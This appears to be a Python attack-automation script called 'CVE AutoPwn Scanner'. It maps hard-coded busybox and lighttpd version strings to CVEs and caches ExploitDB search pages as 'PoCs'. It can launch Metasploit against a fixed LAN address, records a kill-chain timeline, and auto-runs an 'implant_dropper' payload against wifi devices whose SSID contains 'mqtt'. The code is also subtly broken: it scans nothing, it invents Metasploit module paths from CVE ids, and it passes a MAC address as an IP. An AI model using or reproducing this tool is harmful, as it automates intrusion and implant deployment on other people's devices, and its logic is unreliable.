#!/usr/bin/env python3
import os
import json
import requests
import subprocess
from datetime import datetime
from pathlib import Path
import argparse
import threading

FIRMWARE_STRINGS = ['busybox v1.20.2', 'lighttpd/1.4.31']
KNOWN_VULNS = {
    'busybox v1.20.2': 'CVE-2013-1813',
    'lighttpd/1.4.31': 'CVE-2014-2323'
}

NVD_API_KEY = os.getenv("NVD_API_KEY", "DEMO_KEY")
EXPLOIT_DB_SEARCH = "https://www.exploit-db.com/search?q="

KILLCHAIN_PATH = "reports/killchain.json"
ALERT_PUSH_URL = "ws://localhost:8765"
CACHE_FOLDER = "results/pocs"
ASSETS_FILE = "results/wifi_scan.json"

Path("results").mkdir(exist_ok=True)
Path("reports").mkdir(exist_ok=True)
Path(CACHE_FOLDER).mkdir(exist_ok=True)

parser = argparse.ArgumentParser(description="CVE AutoPwn Scanner")
parser.add_argument('--msf', action='store_true', help="Launch Metasploit CLI automatically")
args = parser.parse_args()

print("[*] Scanning for firmware-based vulnerabilities...")

alerts = []
timeline_updates = []

for comp in FIRMWARE_STRINGS:
    if comp in KNOWN_VULNS:
        cve = KNOWN_VULNS[comp]
        print(f"[!] Found vulnerable component: {comp} => {cve}")
        print(f"    Searching ExploitDB: {EXPLOIT_DB_SEARCH}{cve}")

        # Try PoC auto-download
        poc_file = os.path.join(CACHE_FOLDER, f"{cve}.txt")
        if not os.path.exists(poc_file):
            try:
                r = requests.get(EXPLOIT_DB_SEARCH + cve)
                with open(poc_file, "w") as f:
                    f.write(r.text[:3000])  # Save snippet
                print(f"[+] PoC cached: {poc_file}")
            except:
                print(f"[!] Failed to download PoC for {cve}")
        else:
            print(f"[=] PoC already cached: {poc_file}")

        # Timeline update
        timeline_updates.append({
            "stage": "Exploitation",
            "cve": cve,
            "timestamp": datetime.now().isoformat(),
            "component": comp,
            "poc": poc_file
        })

        # Push to dashboard agent feed
        alerts.append({
            "type": "cve_alert",
            "cve": cve,
            "component": comp,
            "severity": "high",
            "tags": ["autopwn", "exploit"],
            "timestamp": datetime.now().isoformat()
        })

        # Metasploit launch (optional)
        if args.msf:
            msf_command = f"use exploit/linux/http/{cve.lower().replace('-', '_')}\nset RHOST 192.168.1.100\nrun\n"
            print("[+] Launching Metasploit with template (non-interactive)...")
            subprocess.Popen(['msfconsole', '-q', '-x', msf_command])

# Save killchain timeline
if os.path.exists(KILLCHAIN_PATH):
    with open(KILLCHAIN_PATH) as f:
        killchain = json.load(f)
else:
    killchain = {"generated": datetime.now().isoformat(), "events": []}

killchain["events"].extend(timeline_updates)
with open(KILLCHAIN_PATH, "w") as f:
    json.dump(killchain, f, indent=2)

print(f"[+] Kill chain timeline updated: {KILLCHAIN_PATH}")

# Push alerts to agents
def push_alerts():
    try:
        import websocket
        ws = websocket.create_connection(ALERT_PUSH_URL)
        for alert in alerts:
            ws.send(json.dumps(alert))
        ws.close()
        print("[+] Alerts pushed to dashboard.")
    except Exception as e:
        print(f"[!] Dashboard push failed: {e}")

threading.Thread(target=push_alerts).start()

# Auto-trigger implants on matching devices
if os.path.exists(ASSETS_FILE):
    try:
        with open(ASSETS_FILE) as f:
            wifi_data = json.load(f)
            for dev in wifi_data:
                if "mqtt" in dev.get("SSID", "").lower():
                    ip = dev.get("BSSID", "unknown")
                    print(f"[>] Auto-triggering implant on {ip}...")
                    os.system(f"python3 modules/payloads/implant_dropper.py --target {ip}")
    except:
        print("[!] Could not auto-trigger implants from wifi_scan.json")
